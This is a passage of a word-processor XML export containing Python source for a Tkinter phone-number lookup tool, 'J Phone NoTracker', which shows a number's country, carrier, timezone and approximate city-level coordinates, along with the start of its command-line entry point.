      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Configure text tags for colors</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_configure('header', foreground='#4ec9b0', font=('Consolas', 11, 'bold'))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_configure('label', foreground='#9cdcfe')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_configure('value', foreground='#ce9178')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_configure('success', foreground='#6a9955')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_configure('error', foreground='#f44747')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Action buttons</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>actions_frame = ttk.Frame(main_frame)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>actions_frame.pack(fill=tk.X, pady=(15, 0))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.copy_button = ttk.Button(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="📋 Copy Results",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>command=self.copy_results,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.copy_button.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.map_button = ttk.Button(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="🗺️ Open in Maps",</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="12"/>command=self.open_in_maps,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.map_button.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.save_button = ttk.Button(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>text="💾 Save to History",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>command=self.save_to_history,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.save_button.pack(side=tk.LEFT)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Status bar</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var = tk.StringVar()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var.set("Ready")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>status_bar = ttk.Label(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.root,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>textvariable=self.status_var,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>relief=tk.SUNKEN,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>anchor=tk.W</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>status_bar.pack(side=tk.BOTTOM, fill=tk.X)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Welcome message</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.show_welcome()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def show_welcome(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Show welcome message in results area."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>welcome_text = (</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"╔══════════════════════════════════════════════════════════╗\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="10"/>J Phone NoTracker - Phone Intelligence <text:s text:c="8"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>Enter a phone number in international format and <text:s text:c="6"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>click TRACK to get detailed information including: <text:s text:c="4"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Country &amp; City Location <text:s text:c="29"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Mobile Carrier / Network Operator <text:s text:c="19"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Timezone &amp; Local Time <text:s text:c="31"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Geographic Coordinates <text:s text:c="30"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Number Type (Mobile/Fixed/VoIP/etc.) <text:s text:c="16"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="2"/>Example: +255712345678 (Tanzania - tiGO) <text:s text:c="14"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>"╚══════════════════════════════════════════════════════════╝\n"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.delete(1.0, tk.END)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(1.0, welcome_text)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.tag_add('header', '1.0', 'end')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track_number(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Execute phone number tracking."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>raw_number = self.phone_var.get().strip()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not raw_number:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>messagebox.showwarning("Input Required", "Please enter a phone number.")</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Sanitize input</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>clean_number = sanitize_phone_number(raw_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var.set(f"Tracking {clean_number}...")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.config(cursor="watch")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.update()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Perform tracking</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result = self.tracker.track(clean_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.current_result = result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Display results</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.display_results(result)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Enable action buttons if valid</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.copy_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>self.map_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.save_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.status_var.set(f"Success: {result.country_name} - {result.carrier_name or 'Unknown carrier'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.status_var.set("Error: Invalid phone number")</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Tracking error: {e}", exc_info=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>messagebox.showerror("Error", f"Failed to track number: {str(e)}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.status_var.set("Error occurred")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>finally:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.root.config(cursor="")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def display_results(self, result: PhoneNumberInfo):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Display tracking results with formatting.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result: PhoneNumberInfo object</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.delete(1.0, tk.END)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n❌ INVALID PHONE NUMBER\n\n")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Please check the format and try again.\n")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Expected format: +[country code][number]\n")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Example: +255712345678")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.tag_add('error', '1.0', 'end')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Header</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n📱 PHONE NUMBER INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Basic information</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>self.results_text.insert(tk.END, "Number: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.raw_number}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "Country: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.country_name}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.location and result.location != result.country_name:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Region/City: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.location}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "Number Type: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.number_type}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Carrier</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n📡 NETWORK INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.carrier_name:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Carrier: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.carrier_name}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Carrier: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Not available (may be landline or VoIP)\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Timezone</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n⏰ TIME INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.timezones:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Timezone: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{', '.join(result.timezones)}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.local_time:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Local Time: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.local_time}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Geographic coordinates</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n🗺️ GEOGRAPHIC LOCATION\n\n", 'header')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Latitude: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.latitude:.6f}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "Longitude: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.longitude:.6f}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n📍 Approximate city-level location\n", 'success')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Timestamp</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n⏱️ Lookup performed: ", 'label')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.lookup_timestamp}\n", 'value')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def clear_input(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Clear input field and reset display."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.phone_var.set("+255")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.current_result = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.copy_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>self.map_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.save_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.show_welcome()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var.set("Ready")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def copy_results(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Copy results to clipboard."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not self.current_result:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>text = self.results_text.get(1.0, tk.END).strip()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.clipboard_clear()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.root.clipboard_append(text)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var.set("Results copied to clipboard")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def open_in_maps(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Open location in Google Maps."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not self.current_result or not self.current_result.latitude:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>lat = self.current_result.latitude</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>lon = self.current_result.longitude</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>url = f"https://www.google.com/maps?q={lat},{lon}"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>webbrowser.open(url)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.status_var.set(f"Opened in Google Maps: {lat:.4f}, {lon:.4f}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def save_to_history(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Save current lookup to history file."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not self.current_result:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>import json</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>from datetime import datetime</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>history_entry = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>"timestamp": datetime.now().isoformat(),</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>"number": self.current_result.raw_number,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>"result": self.current_result.to_dict()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Append to history file</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>with open("data/history/lookups.json", "a") as f:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>f.write(json.dumps(history_entry) + "\n")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.status_var.set("Saved to history")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>logger.error(f"Failed to save history: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>messagebox.showerror("Error", f"Could not save: {str(e)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">File:</text:span> src/main.py (Entry Point)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">#!/usr/bin/env python3</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">J Phone NoTracker - Main Entry Point</text:p>
      <text:p text:style-name="P27">Phone number intelligence and geolocation application.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import sys</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>import os</text:p>
      <text:p text:style-name="P27">import argparse</text:p>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Add project root to path</text:p>
      <text:p text:style-name="P27">sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">from src.gui.window import PhoneTrackerGUI</text:p>
      <text:p text:style-name="P27">from src.utils.logger import setup_logging</text:p>
      <text:p text:style-name="P27">from src.core.tracker import get_tracker</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def parse_arguments():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Parse command line arguments."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser = argparse.ArgumentParser(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>description="J Phone NoTracker - Phone Number Intelligence"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--no-gui",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Run in command-line mode (no GUI)"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"phone_number",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>nargs="?",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Phone number to track (for CLI mode)"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--offline",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Disable online geocoding (use only offline databases)"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--verbose",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"-v",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Enable verbose logging"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return parser.parse_args()</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def cli_mode(args):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Run in command-line mode."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not args.phone_number:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("Error: Phone number required in CLI mode")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("Usage: python main.py --no-gui +255712345678")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Configure logging</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>log_level = logging.DEBUG if args.verbose else logging.INFO</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>setup_logging(level=log_level)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Create tracker</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = get_tracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker.use_online_geocoding = not args.offline</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"🔍 Tracking: {args.phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print("-" * 50)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="4"/># Perform tracking</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>result = tracker.track(args.phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Display results</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("❌ Invalid phone number")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"📱 Number: {result.raw_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"🌍 Country: {result.country_name}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if result.location and result.location != result.country_name:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"📍 Location: {result.location}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"📡 Carrier: {result.carrier_name or 'Unknown'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"⏰ Timezone: {result.timezones[0] if result.timezones else 'Unknown'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if result.local_time:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"🕐 Local Time: {result.local_time}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"🗺️ Coordinates: {result.latitude:.6f}, {result.longitude:.6f}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def gui_mode(args):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Run in GUI mode."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Configure logging</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>log_level = logging.DEBUG if args.verbose else logging.INFO</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>setup_logging(level=log_level)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Configure tracker settings</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = get_tracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker.use_online_geocoding = not args.offline</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Launch GUI</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>import tkinter as tk</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>root = tk.Tk()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>app = PhoneTrackerGUI(root)</text:p>
